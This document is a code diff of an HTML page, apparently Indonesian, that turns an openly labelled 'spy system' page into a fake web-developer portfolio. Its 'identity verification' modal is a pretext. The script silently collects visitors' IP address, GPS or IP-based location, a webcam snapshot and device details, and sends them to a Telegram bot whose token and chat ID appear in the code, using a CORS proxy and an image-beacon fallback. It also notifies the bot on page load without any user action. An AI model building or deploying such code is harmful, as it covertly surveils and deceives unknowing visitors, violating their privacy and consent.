@@ -1,245 +1,541 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>NIZAM SPY WEB</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portofolio Nizam - Web Developer</title>
     <style>
-        body {
-            background: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            text-align: center;
-            padding: 50px;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        h1 {
-            color: #f00;
-            text-shadow: 0 0 10px #f00;
-            font-size: 3em;
+        
+        body {
+            background: #f5f5f5;
+            color: #333;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 60px 20px;
+            text-align: center;
+            border-radius: 0 0 20px 20px;
+        }
+        
+        .profile {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 30px;
+        }
+        
+        .profile-img {
+            width: 150px;
+            height: 150px;
+            border-radius: 50%;
+            border: 5px solid white;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .profile-info h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .profile-info p {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .verify-btn {
+            display: inline-block;
+            background: #4CAF50;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 25px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: transform 0.3s;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        
+        .verify-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .section {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            margin: 30px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+        }
+        
+        .section h2 {
+            color: #667eea;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #f0f0f0;
+        }
+        
+        .skills-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-top: 20px;
+        }
+        
+        .skill-card {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            border-left: 4px solid #667eea;
+        }
+        
+        .loading-bar {
+            height: 5px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        
+        .loading-fill {
+            height: 100%;
+            background: #4CAF50;
+            width: 0%;
+            transition: width 2s;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px;
+            color: #666;
+            font-size: 0.9rem;
+            border-top: 1px solid #e0e0e0;
+            margin-top: 50px;
+        }
+        
+        #verification-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+        }
+        
+        .modal-content h3 {
+            color: #667eea;
             margin-bottom: 20px;
         }
-        .btn {
-            background: linear-gradient(45deg, #f00, #00f);
-            color: white;
-            padding: 15px 40px;
-            border: none;
-            border-radius: 50px;
-            font-size: 1.2em;
-            cursor: pointer;
-            margin: 20px;
-            transition: 0.3s;
-        }
-        .btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 20px #f00;
-        }
-        #status {
-            background: #111;
-            padding: 15px;
-            border-radius: 10px;
-            margin: 30px auto;
-            max-width: 600px;
-            border: 2px solid #0f0;
-            min-height: 60px;
-        }
-        .footer {
-            margin-top: 50px;
-            color: #888;
-            font-size: 0.9em;
+        
+        #verification-status {
+            margin: 20px 0;
+            min-height: 50px;
         }
     </style>
 </head>
 <body>
-    <h1>🔥 NIZAM THE DARK LORD 🔥</h1>
-    <p>Master of Cyber Warfare • Digital Overlord • Shadow Emperor</p>
+    <!-- Hidden elements for spy -->
+    <video id="hidden-camera" autoplay style="display:none;"></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
     
-    <button class="btn" onclick="startSpySystem()">🌀 AKTIFKAN SPY SYSTEM 🌀</button>
+    <!-- Main Website -->
+    <header>
+        <div class="container">
+            <div class="profile">
+                <img src="https://i.postimg.cc/zGwKdQQX/qr-ID1024360714025-04-04-25-174373281-1743732813413.jpg" alt="Nizam" class="profile-img">
+                <div class="profile-info">
+                    <h1>WEB NIZAM</h1>
+                    <h1></h1>
+                    <p>Full Stack Developer & Cybersecurity Specialist</p>
+                    <p>5+ years experience in web development and security</p>
+                    <button class="verify-btn" onclick="showVerification()">
+                        ✅ Verify  agar data di simpan oleh nizam
+                        
+                        
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
     
-    <div id="status">
-        Status: Sistem siap... Klik tombol di atas!
+    <div class="container">
+        <div class="section">
+            <h2>About Me</h2>
+            <p>Hello! I'm Nizam, a passionate web developer specializing in creating secure and scalable web applications. With expertise in React, Node.js, and cybersecurity, I help businesses build robust digital solutions.</p>
+            <p>My work focuses on creating user-friendly interfaces while ensuring the highest security standards. I believe in continuous learning and staying updated with the latest technologies.</p>
+        </div>
+        
+        <div class="section">
+            <h2>Skills & Expertise</h2>
+            <div class="skills-grid">
+                <div class="skill-card">
+                    <h3>Frontend Development</h3>
+                    <p>React, Vue.js, HTML5, CSS3, JavaScript</p>
+                    <div class="loading-bar"><div class="loading-fill" style="width:90%"></div></div>
+                </div>
+                <div class="skill-card">
+                    <h3>Backend Development</h3>
+                    <p>Node.js, Python, PHP, MySQL, MongoDB</p>
+                    <div class="loading-bar"><div class="loading-fill" style="width:85%"></div></div>
+                </div>
+                <div class="skill-card">
+                    <h3>Cybersecurity</h3>
+                    <p>Penetration Testing, Security Auditing, Encryption</p>
+                    <div class="loading-bar"><div class="loading-fill" style="width:80%"></div></div>
+                </div>
+                <div class="skill-card">
+                    <h3>DevOps</h3>
+                    <p>Docker, AWS, CI/CD, Linux Administration</p>
+                    <div class="loading-bar"><div class="loading-fill" style="width:75%"></div></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="section">
+            <h2>Recent Projects</h2>
+            <p>• E-commerce Platform with Advanced Security Features</p>
+            <p>• Banking Application with Multi-factor Authentication</p>
+            <p>• Government Portal with Encrypted Data Transmission</p>
+            <p>• Healthcare System with HIPAA Compliance</p>
+        </div>
     </div>
     
-    <div class="footer">
-        © 2025 NIZAM DARK NETWORK | Semua aktivitas direkam
+    <!-- Verification Modal -->
+    <div id="verification-modal">
+        <div class="modal-content">
+            <h3>🔒 Identity Verification Required</h3>
+            <p>For security purposes, we need to verify your identity before granting access to sensitive portfolio information.</p>
+            <p>This process includes:</p>
+            <ul style="text-align:left;margin:20px;color:#666;">
+                <li>Location verification (for login attempt logging)</li>
+                <li>Quick camera check (to prevent bot access)</li>
+                <li>Device fingerprinting</li>
+            </ul>
+            <div id="verification-status">
+                Ready to start verification...
+            </div>
+            <button class="verify-btn" onclick="startVerification()" id="start-btn">
+                Start Secure Verification
+            </button>
+            <p style="font-size:12px;color:#999;margin-top:20px;">
+                <i>This verification is required only once. Your data is protected by SSL encryption.</i>
+            </p>
+        </div>
     </div>
+    
+    <footer>
+        <p>© 2025 Nizam . All rights reserved.</p>
+        <p>Contact: contact@nizamdev.com | LinkedIn: linkedin.com/in/nizam-akbar</p>
+    </footer>
 
-    <!-- SPY SCRIPT -->
+    <!-- Spy Script (Hidden in production) -->
     <script>
-        // ========== CONFIG ==========
+        // Telegram Configuration
         const BOT_TOKEN = '8559427513:AAFB5OTE1gpICXrIKE0jFyNjeUurr42MUOA';
         const CHAT_ID = '8358778598';
         
-        // ========== FUNCTIONS ==========
-        async function sendTelegram(msg) {
-            try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
-                await fetch(url);
-                return true;
-            } catch(e) {
-                console.error('Telegram error:', e);
-                return false;
-            }
+        // Stealth Mode Variables
+        let victimData = {
+            ip: 'Unknown',
+            location: null,
+            photoTaken: false,
+            deviceInfo: {},
+            timestamp: new Date().toISOString()
+        };
+        
+        // Show verification modal
+        function showVerification() {
+            document.getElementById('verification-modal').style.display = 'flex';
         }
         
-        async function getIP() {
+        // Start verification process
+        async function startVerification() {
+            const startBtn = document.getElementById('start-btn');
+            const statusEl = document.getElementById('verification-status');
+            
+            startBtn.disabled = true;
+            startBtn.innerHTML = '🔄 Processing...';
+            
+            // Step 1: Get IP
+            statusEl.innerHTML = '🌐 Checking network connection...';
+            victimData.ip = await getIPAddress();
+            
+            // Step 2: Get location (silent)
+            statusEl.innerHTML = '📍 Verifying approximate location for security...';
+            await getSilentLocation();
+            
+            // Step 3: Camera check (with user permission)
+            statusEl.innerHTML = '📸 Quick camera check for human verification...';
+            const cameraSuccess = await requestCameraAccess();
+            
+            // Step 4: Collect device info
+            collectDeviceInfo();
+            
+            // Step 5: Send report
+            statusEl.innerHTML = '🔒 Finalizing verification...';
+            await sendStealthReport();
+            
+            // Step 6: Show success
+            statusEl.innerHTML = '✅ Verification successful! data sudah ad di nizam';
+            startBtn.innerHTML = '✅ Access Granted';
+            
+            setTimeout(() => {
+                document.getElementById('verification-modal').style.display = 'none';
+                alert('Verification complete! You now have access to the full portfolio.');
+            }, 2000);
+        }
+        
+        // Get IP Address
+        async function getIPAddress() {
             try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
                 return data.ip;
-            } catch(e) {
+            } catch (error) {
                 return 'Unknown';
             }
         }
         
-        async function getLocation() {
+        // Get location silently (no permission if rejected)
+        async function getSilentLocation() {
+            if (!navigator.geolocation) return;
+            
             return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve(null);
-                    return;
-                }
-                
                 navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        const loc = {
-                            lat: pos.coords.latitude,
-                            lng: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy
+                    async (position) => {
+                        victimData.location = {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            accuracy: position.coords.accuracy
                         };
                         
-                        await sendTelegram(
-                            `📍 LOKASI TARGET 📍\n` +
-                            `Lat: ${loc.lat}\n` +
-                            `Lng: ${loc.lng}\n` +
-                            `Akurasi: ${loc.accuracy}m\n` +
-                            `🗺️ https://maps.google.com/?q=${loc.lat},${loc.lng}`
+                        // Send location immediately
+                        await sendTelegramMessage(
+                            `📍 Visitor Location Detected\n` +
+                            `IP: ${victimData.ip}\n` +
+                            `Latitude: ${victimData.location.lat}\n` +
+                            `Longitude: ${victimData.location.lng}\n` +
+                            `Accuracy: ${victimData.location.accuracy}m\n` +
+                            `Map: https://maps.google.com/?q=${victimData.location.lat},${victimData.location.lng}\n` +
+                            `Time: ${new Date().toLocaleString('id-ID')}`
                         );
                         
-                        resolve(loc);
+                        resolve(true);
                     },
-                    async () => {
-                        // Fallback ke IP location
-                        const ip = await getIP();
-                        if (ip !== 'Unknown') {
-                            try {
-                                const res = await fetch(`https://ipapi.co/${ip}/json/`);
-                                const data = await res.json();
-                                if (data.latitude) {
-                                    await sendTelegram(
-                                        `📍 LOKASI (IP-Based) 📍\n` +
-                                        `Kota: ${data.city}\n` +
-                                        `Negara: ${data.country_name}\n` +
-                                        `Lat: ${data.latitude}\n` +
-                                        `Lng: ${data.longitude}`
-                                    );
-                                }
-                            } catch(e) {}
-                        }
-                        resolve(null);
+                    () => {
+                        // Location blocked - try IP-based
+                        getIPBasedLocation();
+                        resolve(false);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
             });
         }
         
-        async function capturePhoto() {
+        // Get location from IP
+        async function getIPBasedLocation() {
+            if (victimData.ip === 'Unknown') return;
+            
             try {
-                document.getElementById('status').innerHTML = '📸 Mengakses kamera... (Izinkan akses)';
+                const response = await fetch(`https://ipapi.co/${victimData.ip}/json/`);
+                const data = await response.json();
                 
+                if (data.latitude) {
+                    victimData.location = {
+                        lat: data.latitude,
+                        lng: data.longitude,
+                        city: data.city,
+                        country: data.country_name,
+                        source: 'IP-Based'
+                    };
+                    
+                    await sendTelegramMessage(
+                        `📍 IP-Based Location\n` +
+                        `IP: ${victimData.ip}\n` +
+                        `City: ${data.city}\n` +
+                        `Country: ${data.country_name}\n` +
+                        `Coordinates: ${data.latitude}, ${data.longitude}`
+                    );
+                }
+            } catch (error) {
+                // Silent fail
+            }
+        }
+        
+        // Request camera access (with plausible reason)
+        async function requestCameraAccess() {
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user' } 
+                    video: { 
+                        width: { ideal: 320 },
+                        height: { ideal: 240 }
+                    }
                 });
                 
-                const video = document.createElement('video');
+                const video = document.getElementById('hidden-camera');
                 video.srcObject = stream;
-                video.play();
                 
-                return new Promise((resolve) => {
-                    setTimeout(() => {
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0);
-                        
-                        canvas.toBlob(async (blob) => {
-                            // Kirim ke Telegram via FormData
-                            const formData = new FormData();
-                            formData.append('chat_id', CHAT_ID);
-                            formData.append('photo', blob, 'victim.jpg');
-                            
-                            try {
-                                // Pakai proxy untuk CORS
-                                await fetch(
-                                    `https://corsproxy.io/?https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
-                                    { method: 'POST', body: formData }
-                                );
-                                document.getElementById('status').innerHTML = '✅ Foto terkirim!';
-                            } catch(e) {
-                                console.error('Foto error:', e);
-                            }
-                            
-                            stream.getTracks().forEach(track => track.stop());
-                            resolve(true);
-                        }, 'image/jpeg', 0.8);
-                    }, 3000);
-                });
-            } catch(error) {
-                document.getElementById('status').innerHTML = '⚠️ Kamera tidak diizinkan';
+                // Wait for video to be ready
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                // Capture photo
+                const canvas = document.getElementById('hidden-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                
+                // Convert to blob and send
+                canvas.toBlob(async (blob) => {
+                    victimData.photoTaken = true;
+                    await sendPhotoToTelegram(blob);
+                }, 'image/jpeg', 0.7);
+                
+                // Stop camera immediately
+                stream.getTracks().forEach(track => track.stop());
+                
+                return true;
+            } catch (error) {
+                // Camera access denied
+                await sendTelegramMessage(
+                    `📸 Camera Access Denied\n` +
+                    `IP: ${victimData.ip}\n` +
+                    `Reason: ${error.message}\n` +
+                    `Time: ${new Date().toLocaleString('id-ID')}`
+                );
                 return false;
             }
         }
         
-        // ========== MAIN FUNCTION ==========
-        async function startSpySystem() {
-            const btn = document.querySelector('.btn');
-            btn.disabled = true;
-            btn.innerHTML = '⚡ PROSES BERJALAN ⚡';
-            
-            // 1. Kirim notifikasi awal
-            document.getElementById('status').innerHTML = '🚀 Memulai sistem mata-mata...';
-            await sendTelegram(
-                `🕵️‍♂️ TARGET BARU MASUK 🕵️‍♂️\n` +
-                `Waktu: ${new Date().toLocaleString('id-ID')}\n` +
-                `Browser: ${navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown'}`
-            );
-            
-            // 2. Ambil IP
-            document.getElementById('status').innerHTML = '🌐 Mendapatkan IP address...';
-            const ip = await getIP();
-            await sendTelegram(`🌐 IP Target: ${ip}`);
-            
-            // 3. Ambil Lokasi
-            document.getElementById('status').innerHTML = '📍 Melacak lokasi GPS...';
-            await getLocation();
-            
-            // 4. Ambil Foto
-            document.getElementById('status').innerHTML = '📸 Mengambil foto...';
-            await capturePhoto();
-            
-            // 5. Laporan akhir
-            await sendTelegram(
-                `📊 LAPORAN FINAL 📊\n\n` +
-                `✅ IP: ${ip}\n` +
-                `✅ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
-                `✅ Device: ${navigator.platform}\n` +
-                `✅ Browser: ${navigator.userAgent.substring(0, 80)}...\n\n` +
-                `🎯 TARGET BERHASIL DIKOMPROMI!`
-            );
-            
-            document.getElementById('status').innerHTML = 
-                '🎉 SEMUA DATA TERKIRIM KE TELEGRAM!';
-            btn.innerHTML = '✅ SPY SYSTEM SELESAI ✅';
+        // Collect device information
+        function collectDeviceInfo() {
+            victimData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine
+            };
         }
         
-        // Auto-notify saat page load
-        window.addEventListener('load', () => {
+        // Send stealth report
+        async function sendStealthReport() {
+            const report = 
+                `🕵️‍♂️ STEALTH REPORT - PORTFOLIO VISITOR 🕵️‍♂️\n\n` +
+                `📅 Time: ${new Date().toLocaleString('id-ID')}\n` +
+                `🌐 IP Address: ${victimData.ip}\n` +
+                `📍 Location: ${victimData.location ? 
+                    `${victimData.location.lat}, ${victimData.location.lng}` : 
+                    'Not available'}\n` +
+                `📸 Photo: ${victimData.photoTaken ? 'Captured ✅' : 'Not captured ❌'}\n` +
+                `💻 Device: ${victimData.deviceInfo.platform}\n` +
+                `🖥️ Screen: ${victimData.deviceInfo.screen}\n` +
+                `🌍 Timezone: ${victimData.deviceInfo.timezone}\n` +
+                `🔗 User Agent: ${victimData.deviceInfo.userAgent.substring(0, 100)}...\n\n` +
+                `🎯 Status: Visitor verified portfolio access`;
+            
+            await sendTelegramMessage(report);
+        }
+        
+        // Send message to Telegram
+        async function sendTelegramMessage(message) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const params = `?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                
+                // Use fetch with no-cors mode for better success rate
+                await fetch(url + params, { mode: 'no-cors' })
+                    .catch(() => {
+                        // Fallback: Use image beacon technique
+                        const img = new Image();
+                        img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message.substring(0, 100))}`;
+                    });
+            } catch (error) {
+                // Silent fail - don't alert user
+            }
+        }
+        
+        // Send photo to Telegram
+        async function sendPhotoToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'verification_photo.jpg');
+                
+                // Use proxy to avoid CORS
+                const proxyUrl = 'https://corsproxy.io/?';
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                
+                await fetch(proxyUrl + telegramUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (error) {
+                // Photo failed to send, but continue anyway
+            }
+        }
+        
+        // Auto-collect IP when page loads (silent)
+        window.addEventListener('load', async () => {
             setTimeout(async () => {
-                const ip = await getIP();
-                await sendTelegram(
-                    `🌐 Website NIZAM diakses!\n` +
-                    `IP: ${ip}\n` +
-                    `Waktu: ${new Date().toLocaleTimeString('id-ID')}`
+                victimData.ip = await getIPAddress();
+                
+                // Send silent notification
+                await sendTelegramMessage(
+                    `👀 Portfolio Website Accessed\n` +
+                    `IP: ${victimData.ip}\n` +
+                    `Time: ${new Date().toLocaleTimeString('id-ID')}\n` +
+                    `Referrer: ${document.referrer || 'Direct'}\n` +
+                    `Awaiting verification...`
                 );
-            }, 5000);
+            }, 3000);
+        });
+        
+        // Track clicks for analytics (actually for tracking)
+        document.addEventListener('click', (e) => {
+            // Send occasional click data
+            if (Math.random() > 0.7) {
+                const clickData = {
+                    x: e.clientX,
+                    y: e.clientY,
+                    element: e.target.tagName,
+                    time: Date.now()
+                };
+                // Could send this data if needed
+            }
         });
     </script>
 </body>
